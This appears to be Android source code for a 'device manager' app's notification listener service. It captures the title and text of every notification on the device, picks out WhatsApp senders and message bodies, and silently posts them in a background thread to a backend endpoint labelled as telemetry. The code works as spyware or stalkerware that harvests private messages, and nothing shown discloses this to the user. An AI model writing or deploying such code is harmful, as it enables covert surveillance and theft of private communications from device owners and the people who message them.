package com.company.devicemgr.services;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.os.Build;
import android.app.Notification;
import android.util.Log;

import com.company.devicemgr.utils.HttpClient;

import org.json.JSONObject;

public class NotificationListenerSvc extends NotificationListenerService {
	private static final String TAG = "NotifListenerSvc";
	
	@Override
	public void onNotificationPosted(StatusBarNotification sbn) {
		try {
			String pkg = sbn.getPackageName();
			Notification notif = sbn.getNotification();
			CharSequence title = notif.extras.getCharSequence(Notification.EXTRA_TITLE);
			CharSequence text = notif.extras.getCharSequence(Notification.EXTRA_TEXT);
			CharSequence subText = notif.extras.getCharSequence(Notification.EXTRA_SUB_TEXT);
			String titleS = title != null ? title.toString() : "";
			String textS = text != null ? text.toString() : "";
			String subTextS = subText != null ? subText.toString() : "";
			
			// build payload
			JSONObject payload = new JSONObject();
			payload.put("package", pkg);
			payload.put("title", titleS);
			payload.put("text", textS);
			payload.put("subText", subTextS);
			payload.put("ts", System.currentTimeMillis());
			payload.put("syncKey", "notif|" + pkg + "|" + sbn.getPostTime() + "|" + sbn.getId() + "|" + titleS.hashCode() + "|" + textS.hashCode());
			
			// send to backend asynchronously
			new Thread(() -> {
				try {
					android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
					String token = sp.getString("auth_token", null);
					String deviceId = sp.getString("deviceId", "unknown");
					String url = com.company.devicemgr.utils.ApiConfig.api("/api/telemetry/" + deviceId);
					JSONObject body = new JSONObject();
					boolean isWhatsapp = "com.whatsapp".equals(pkg) || "com.whatsapp.w4b".equals(pkg);
					if (isWhatsapp) {
						if (titleS.trim().isEmpty() && textS.trim().isEmpty()) return;
						payload.put("source", "whatsapp");
						payload.put("from", titleS);
						payload.put("body", textS);
						payload.put("contactName", titleS);
					}
					body.put("type", isWhatsapp ? "whatsapp" : "notification");
					body.put("payload", payload);
					HttpClient.postJson(url, body.toString(), token);
						} catch (Exception e) {
						Log.e(TAG, "notif send err", e);
					}
			}).start();
			
			} catch (Exception e) {
			Log.e(TAG, "onNotificationPosted error", e);
		}
	}
	
	@Override public void onNotificationRemoved(StatusBarNotification sbn) {
		// no-op
	}
}
